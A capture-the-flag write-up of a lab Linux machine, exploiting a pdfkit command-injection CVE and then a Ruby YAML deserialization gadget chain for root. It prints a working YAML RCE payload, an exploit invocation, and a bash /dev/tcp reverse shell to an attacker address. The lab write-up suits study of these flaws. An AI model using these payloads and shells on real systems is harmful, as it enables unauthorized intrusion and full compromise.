
- I am given an IP address of a Linux machine
- I start with a `nmap` scan to enumerate the open ports
```shell
nmap -sC -sV 10.10.11.189
```
![[Pasted image 20250830104811.png]]
- 2 ports are open:
	- port `22` open for `ssh`
	- port `80` open for `HTTP` 

- So on port `80` we have a web application which runs on `nginx` and also plus with `Phussion Passenger` 
- Accessing the web application we are met with an application that converts web pages to PDF
![[Pasted image 20250830105640.png]]

- From a `Response` of a simple request to this page, I discovered that the server runs on `ruby` which can maybe help us later
![[Pasted image 20250830110050.png]]

- Next I wanted to see what happens when I submit a file, maybe I can introduce some commands and exploit directly
- I created a simple file `file.sh` with the content:
```shell
#!/bin/bash
id
`id`
whoami
```
- Then I started a web server with python
```shell
python3 -m http.server 80
```
- Next I introduce the URL of the file in the form and click `Submit`
![[Pasted image 20250830110617.png]]
- It downloaded me the PDF version but without the desired results
![[Pasted image 20250830110806.png]]

- Because I got nothing until now I decided to intercept the response, from the request I used previously, when trying to download the pdf file
- Using the Intercept function from the `Proxy` tab, I caught the pdf download response
- The response was full with binary data, but at the end of it I found who is responsible for the generation of PDFs
![[Pasted image 20250830112314.png]]

- Next thing to do is to search for more information about `pdfkit v0.8.6` 
- First thing I found about this version is that it has a major flaw, more accurate the [CVE-2022-25765](https://nvd.nist.gov/vuln/detail/CVE-2022-25765) vulnerability
- This vulnerability leads to Command Injection, which ultimately leads to access to the server

- Using `searchsploit` I also found an exploit for this vulnerability which helps me get a reverse shell
![[Pasted image 20250830112931.png]]
- The script needs an additional argument (besides the usual target URL and my IP and port for a reverse shell), that is the parameter which is used when making the POST request to transform the web page into a PDF
- In this situation since the application needs an URL the parameter was also named `url`
- Additionally I had to use `nc -lvnp 4444` to open a listener on port `4444` to catch the reverse shell, then I run the exploit
```shell
python3 51293.py -s 10.10.14.8 4444 -w http://precious.htb/ -p url
```
- The exploit was successful returning a reverse shell as the user `ruby`inside the server
![[Pasted image 20250830113452.png]]
- I also upgraded my shell using python
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- Now that I got access to the server, I wanted to see what users are present in the `/home` directory
![[Pasted image 20250830113844.png]]
- I found the user `henry` which also has the `user.txt` flag, so it become clear that I have to gain access to the user account of `henry`

- Next I searched through the `pdfapp` files to see if I can found any files containing info about the `henry` user
- After an unsuccessful search I wanted to see what the `ruby` user `/home` directory holds
![[Pasted image 20250830114345.png]]
- Besides the usual files, there is a special directory `/.bundle` which is owned by the user `root` and the group `ruby` 
- Going through the `/.bundle` directory I found a file named `config` containing guess what, the credentials of an account of the user `henry` 
![[Pasted image 20250830114708.png]]

- Now that we have these credentials, let's try to connect through `ssh` with them
- The credentials were the ones I needed, as I had a fully functional shell as the user `henry` and also got access to the `/home/henry/user.txt` file which contains the user flag
![[Pasted image 20250830114932.png]]

## Root Flag

- Next step after finding the user flag, was to find the system flag, meaning I had to escalate my privileges to the `root` user
- Firstly I used the `sudo -l` command to see if I can use any command with higher permissions
![[Pasted image 20250830115337.png]]
- From the output I discovered that I can run the ruby script `update_dependencies.rb` with root permissions

- Going to the `/opt` directory I printed to content of the respective script
![[Pasted image 20250830115616.png]]
- From the output of the script, I discovered that the script needs a file named `dependencies.yml` and reads its content line by line 
- Also the script gave me an idea to search for the ruby version and with the version + the `yaml` library, maybe I can find some exploit
```shell
ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
```

- Searching on the internet I found an article https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/ describing exactly what I needed, a universal YAML load deserialization RCE which works for ruby versions `2.x - 3.x`
- After reading the article I deduced I had to now create the file `dependencies.yml` with the next content and **The actual command to execute is in the `git_set` entry**
```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: <command_to_execute>
         method_id: :resolve
```

- I copied the script from above in a `dependencies.yml` file on my machine and to test if the script works I set the command `git_set: id`
- Then I opened a python http server to upload the file on the target
- On the target I changed my directory to the `/tmp` one and downloaded the file
```shell
wget http://10.10.14.8:80/dependencies.yml
```

- Running the `sudo ruby /opt/update_dependencies.rb` command, the script executed as I wanted and gave me the output of the `id` command as the root user
![[Pasted image 20250830121104.png]]

- I repeated the steps from above, only changing the command into one that would give me a reverse shell as the `root` user 
```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"
```

- With the previous modifications I ran the ruby script
- In the meantime on my workstation I opened a listener `nc -lvnp 4444` and got the reverse shell as the `root` user and also got access to the system flag inside the `/root/root.txt` file
![[Pasted image 20250830121523.png]]

